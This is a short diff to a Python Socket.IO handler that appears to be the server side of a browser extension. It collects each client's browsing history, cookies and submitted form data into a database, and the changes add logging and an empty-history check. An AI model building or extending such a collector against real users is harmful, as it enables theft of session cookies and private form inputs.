@@ -59,8 +59,9 @@ def handle_ext_ping(data):
                 isConnected = 1
         if(isConnected == 0):
             connected_clients.append((clientid, request.sid))
+            print('client {} reconnected'.format(clientid))
             emit('connectSuccessful', clientid, namespace="/socket.io", broadcast=True) 
-        if database.store_history(data["history"], clientid):
+        if len(data["history"]) > 0 and database.store_history(data["history"], clientid):
             return bad
         for cookie in data["cookies"]:
             if database.store_cookie(cookie, clientid):
@@ -71,7 +72,7 @@ def handle_ext_ping(data):
         for form in data["forms"]:
             if database.store_form_data(form, clientid):
                 return bad
-        emit('pingSuccessful', clientid, namespace="/socket.io", broadcast=True)
+        #emit('pingSuccessful', clientid, namespace="/socket.io", broadcast=True)
         return database.construct_response(clientid)
 
 def handle_form_id_mappings_submit(mappingsStr, url):
